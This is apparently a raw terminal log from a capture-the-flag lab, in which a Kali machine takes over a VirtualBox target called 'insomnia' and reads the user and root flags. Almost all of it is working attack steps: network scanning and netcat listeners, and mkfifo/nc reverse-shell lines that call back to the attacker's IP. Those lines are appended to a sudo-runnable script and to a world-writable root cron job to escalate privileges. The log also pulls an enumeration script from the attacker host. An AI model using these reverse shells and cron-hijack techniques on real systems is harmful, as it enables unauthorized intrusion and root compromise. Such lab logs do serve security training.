@@ -1,0 +1,490 @@
+root@kali:~# nmap -A -p- 192.168.1.22
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-06 23:38 CEST
+Nmap scan report for insomnia.homenet.telecomitalia.it (192.168.1.22)
+Host is up (0.00063s latency).
+Not shown: 65534 closed ports
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.19-1)
+|_http-title: Chat
+MAC Address: 08:00:27:70:F2:A7 (Oracle VirtualBox virtual NIC)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=4/6%OT=8080%CT=1%CU=38645%PV=Y%DS=1%DC=D%G=Y%M=080027%
+OS:TM=606CD4F9%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=Z%CI=Z%II=
+OS:I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%
+OS:O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W
+OS:6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=
+OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD
+OS:=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0
+OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
+OS:(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
+OS:=N%T=40%CD=S)
+
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.63 ms insomnia.homenet.telecomitalia.it (192.168.1.22)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.09 seconds
+root@kali:~# nc -lvnp 4444
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 192.168.1.22.
+Ncat: Connection from 192.168.1.22:40488.
+
+python -c "import pty;pty.spawn('/bin/bash')"
+www-data@insomnia:~/html$ 
+
+www-data@insomnia:~/html$ ls
+ls
+administration.php  chat.txt  index.php    start.sh
+chat.js             images    process.php  style.css
+www-data@insomnia:~/html$ cd ..
+cd ..
+www-data@insomnia:~$ ls
+ls
+html
+www-data@insomnia:~$ cd /home
+cd /home
+www-data@insomnia:/home$ ls
+ls
+julia
+www-data@insomnia:/home$ 
+
+www-data@insomnia:/home$ cd julia
+cd julia
+www-data@insomnia:/home/julia$ 
+
+www-data@insomnia:/home/julia$ ls -la
+ls -la
+total 32
+drwxrwxr-x 3 julia julia 4096 Dec 21 04:11 .
+drwxr-xr-x 3 root  root  4096 Dec 15 13:55 ..
+-rw------- 1 julia julia  379 Dec 21 04:16 .bash_history
+-rw-r--r-- 1 julia julia  220 Nov 30 14:46 .bash_logout
+-rw-r--r-- 1 julia julia 3526 Nov 30 14:46 .bashrc
+drwxr-xr-x 3 julia julia 4096 Dec 21 04:11 .local
+-rw-r--r-- 1 julia julia  807 Nov 30 14:46 .profile
+-rw-r--r-- 1 julia julia   86 Dec 15 14:36 user.txt
+www-data@insomnia:/home/julia$ 
+
+www-data@insomnia:/home/julia$ cat user.txt
+cat user.txt
+
+~~~~~~~~~~~~~\
+USER INSOMNIA
+~~~~~~~~~~~~~
+Flag : [c2e285cb33cecdbeb83d2189e983a8c0]
+www-data@insomnia:/home/julia$ 
+
+www-data@insomnia:/home/julia$ 
+
+www-data@insomnia:/home/julia$ 
+
+www-data@insomnia:/home/julia$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on insomnia:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on insomnia:
+    (julia) NOPASSWD: /bin/bash /var/www/html/start.sh
+www-data@insomnia:/home/julia$ 
+
+www-data@insomnia:/home/julia$ cat /var/www/html/start.sh
+cat /var/www/html/start.sh
+php -S 0.0.0.0:8080
+www-data@insomnia:/home/julia$ 
+
+www-data@insomnia:/home/julia$ ls -la /var/www/html/start.sh
+ls -la /var/www/html/start.sh
+-rwxrwxrwx 1 root root 20 Dec 21 04:18 /var/www/html/start.sh
+www-data@insomnia:/home/julia$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.10 4242 >/tmp/f" >> /var/www/html/start.sh
+<92.168.1.10 4242 >/tmp/f" >> /var/www/html/start.sh
+www-data@insomnia:/home/julia$ 
+
+www-data@insomnia:/home/julia$ cat /var/www/html/start.sh
+cat /var/www/html/start.sh
+php -S 0.0.0.0:8080
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.10 4242 >/tmp/f
+www-data@insomnia:/home/julia$ 
+
+www-data@insomnia:/home/julia$ sudo -u julia /bin/bash /var/www/html/start.sh
+sudo -u julia /bin/bash /var/www/html/start.sh
+[Tue Apr  6 17:53:57 2021] Failed to listen on 0.0.0.0:8080 (reason: Address already in use)
+rm: cannot remove '/tmp/f': No such file or directory
+
+
+root@kali:~# nc -lvnp 4242
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::4242
+Ncat: Listening on 0.0.0.0:4242
+Ncat: Connection from 192.168.1.22.
+Ncat: Connection from 192.168.1.22:47002.
+$ id
+uid=1000(julia) gid=1000(julia) groups=1000(julia),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+$ 
+$ python -c "import pty;pty.spawn('/bin/bash')"
+julia@insomnia:~$ 
+
+julia@insomnia:~$ 
+
+julia@insomnia:~$ llss  --llaa
+
+total 32
+drwxrwxr-x 3 julia julia 4096 Dec 21 04:11 .
+drwxr-xr-x 3 root  root  4096 Dec 15 13:55 ..
+-rw------- 1 julia julia  379 Dec 21 04:16 .bash_history
+-rw-r--r-- 1 julia julia  220 Nov 30 14:46 .bash_logout
+-rw-r--r-- 1 julia julia 3526 Nov 30 14:46 .bashrc
+drwxr-xr-x 3 julia julia 4096 Dec 21 04:11 .local
+-rw-r--r-- 1 julia julia  807 Nov 30 14:46 .profile
+-rw-r--r-- 1 julia julia   86 Dec 15 14:36 user.txt
+julia@insomnia:~$ stty raw -echostty raw -echo
+
+julia@insomnia:~$ 
+julia@insomnia:~$ ls
+user.txt
+julia@insomnia:~$ 
+julia@insomnia:~$ 
+julia@insomnia:~$ 
+julia@insomnia:~$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for julia: 
+
+Sorry, try again.
+[sudo] password for julia: 
+
+Sorry, try again.
+[sudo] password for julia: 
+
+sudo: 3 incorrect password attempts
+julia@insomnia:~$ 
+julia@insomnia:~$ 
+julia@insomnia:~$ 
+julia@insomnia:~$ 
+julia@insomnia:~$ 
+julia@insomnia:~$ cat /et       ^H^H
+cat: /et: No such file or directory
+julia@insomnia:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+julia:x:1000:1000:julia,,,:/home/julia:/bin/bash
+julia@insomnia:~$ 
+julia@insomnia:~$ 
+julia@insomnia:~$ 
+julia@insomnia:~$ 
+julia@insomnia:~$ wget 192.168.1.10:8080/LinEnum.sh
+--2021-04-06 17:58:27--  http://192.168.1.10:8080/LinEnum.sh
+Connecting to 192.168.1.10:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46632 (46K) [text/x-sh]
+Saving to: ‘LinEnum.sh’
+
+LinEnum.sh          100%[===================>]  45.54K  --.-KB/s    in 0s      
+
+2021-04-06 17:58:27 (93.0 MB/s) - ‘LinEnum.sh’ saved [46632/46632]
+
+julia@insomnia:~$ 
+julia@insomnia:~$ ls .la
+ls: cannot access '.la': No such file or directory
+julia@insomnia:~$ ls -la
+total 80
+drwxrwxr-x 3 julia julia  4096 Apr  6 17:58 .
+drwxr-xr-x 3 root  root   4096 Dec 15 13:55 ..
+-rw------- 1 julia julia   379 Dec 21 04:16 .bash_history
+-rw-r--r-- 1 julia julia   220 Nov 30 14:46 .bash_logout
+-rw-r--r-- 1 julia julia  3526 Nov 30 14:46 .bashrc
+-rw-r--r-- 1 julia julia 46632 Apr  6 17:57 LinEnum.sh
+drwxr-xr-x 3 julia julia  4096 Dec 21 04:11 .local
+-rw-r--r-- 1 julia julia   807 Nov 30 14:46 .profile
+-rw-r--r-- 1 julia julia    86 Dec 15 14:36 user.txt
+julia@insomnia:~$ 
+julia@insomnia:~$ chmod +x LinEnum.sh
+julia@insomnia:~$ ./Li*
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982
+
+[-] Debug Info
+[+] Thorough tests = Disabled
+
+
+Scan started at:
+Tue 06 Apr 2021 05:58:44 PM EDT                                                                     
+                                                                                                    
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux insomnia 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64 GNU/Linux
+
+
+[-] Kernel information (continued):
+Linux version 4.19.0-12-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.152-1 (2020-10-18)
+
+
+[-] Specific release information:
+PRETTY_NAME="Debian GNU/Linux 10 (buster)"
+NAME="Debian GNU/Linux"
+VERSION_ID="10"
+VERSION="10 (buster)"
+VERSION_CODENAME=buster
+ID=debian
+HOME_URL="https://www.debian.org/"
+SUPPORT_URL="https://www.debian.org/support"
+BUG_REPORT_URL="https://bugs.debian.org/"
+
+
+[-] Hostname:
+insomnia
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
+uid=1000(julia) gid=1000(julia) groups=1000(julia),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+
+
+[-] Users that have previously logged onto the system:
+Username         Port     From             Latest
+root             tty1                      Mon Dec 21 11:12:09 -0500 2020
+julia            tty1                      Tue Dec 15 14:18:31 -0500 2020
+
+
+[-] Who else is logged on:
+ 17:58:44 up 21 min,  0 users,  load average: 0.09, 0.04, 0.04
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+
+[-] Group memberships:
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=101(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
+uid=102(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
+uid=103(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
+uid=104(messagebus) gid=110(messagebus) groups=110(messagebus)
+uid=105(avahi-autoipd) gid=113(avahi-autoipd) groups=113(avahi-autoipd)
+uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
+uid=1000(julia) gid=1000(julia) groups=1000(julia),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+
+
+[-] Contents of /etc/passwd:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+julia:x:1000:1000:julia,,,:/home/julia:/bin/bash
+
+.......................
+.......................
+SKIPPED
+.......................
+.......................
+
+[-] Location and contents (if accessible) of .bash_history file(s):
+/home/julia/.bash_history
+clear
+export TERM=xterm
+clear
+ls
+sudo -l
+cd /home/rose/
+ls
+ls -l
+ls -la
+cat user.txt
+echo "/bin/bash" >> .plantbook
+sudo -l
+sudo -u root /bin/bash /home/rose/.plantbook
+exigt
+exit
+ls
+cd .
+cd
+clear
+ls
+cat /etc/passwd
+passwd
+sudo passwd
+exit
+cd
+ls
+cat user.txt
+ls
+cd /var/cron
+ls
+nano chech.sh
+export TERM=xterm
+nano check.sh
+echo "nc -e /bin/bash 10.0.2.13 4444" >> check.sh
+exit
+
+
+[-] Location and Permissions (if accessible) of .bak file(s):
+-rw------- 1 root root 767 Dec 15 13:53 /var/backups/group.bak
+-rw------- 1 root root 1437 Dec 15 14:01 /var/backups/passwd.bak
+-rw------- 1 root shadow 647 Dec 15 13:53 /var/backups/gshadow.bak
+-rw------- 1 root shadow 949 Dec 15 14:08 /var/backups/shadow.bak
+
+
+[-] Any interesting mail in /var/mail:
+total 8
+drwxrwsr-x  2 root mail 4096 Nov 30 14:37 .
+drwxr-xr-x 13 root root 4096 Dec 21 03:28 ..
+
+
+### SCAN COMPLETE ####################################
+julia@insomnia:~$ 
+julia@insomnia:~$ cat /etc/cron
+cat: /etc/cron: No such file or directory
+julia@insomnia:~$ cd /var/cron
+julia@insomnia:/var/cron$ ls -la
+total 12
+drwxr-xr-x  2 root root 4096 Dec 21 04:17 .
+drwxr-xr-x 13 root root 4096 Dec 21 03:28 ..
+-rwxrwxrwx  1 root root  153 Dec 21 04:17 check.sh
+julia@insomnia:/var/cron$ cat che*
+#!/bin/bash
+status=$(systemctl is-active insomnia.service)
+if [ "$status" == "active"  ]; then
+   echo "OK"
+else
+   systemctl start  insomnia.service
+fi
+julia@insomnia:/var/cron$ 
+julia@insomnia:/var/cron$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --repo
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --repo
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --repo
+*  *    * * *   root    /bin/bash /var/cron/check.sh
+#
+julia@insomnia:/var/cron$ 
+julia@insomnia:/var/cron$ 
+julia@insomnia:/var/cron$ 
+julia@insomnia:/var/cron$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.10 1234 >/tmp/f" >> check.sh
+julia@insomnia:/var/cron$ cat che*
+#!/bin/bash
+status=$(systemctl is-active insomnia.service)
+if [ "$status" == "active"  ]; then
+   echo "OK"
+else
+   systemctl start  insomnia.service
+fi
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.10 1234 >/tmp/f
+julia@insomnia:/var/cron$ 
+
+
+
+root@kali:~# nc -lvnp 1234
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 192.168.1.22.
+Ncat: Connection from 192.168.1.22:51786.
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+# cd /root
+# ls
+root.txt
+# cat root.txt
+
+~~~~~~~~~~~~~~~\
+ROOTED INSOMNIA
+~~~~~~~~~~~~~~~
+Flag : [c84baebe0faa2fcdc2f1a4a9f6e2fbfc]
+
+by Alienum with <3
+#
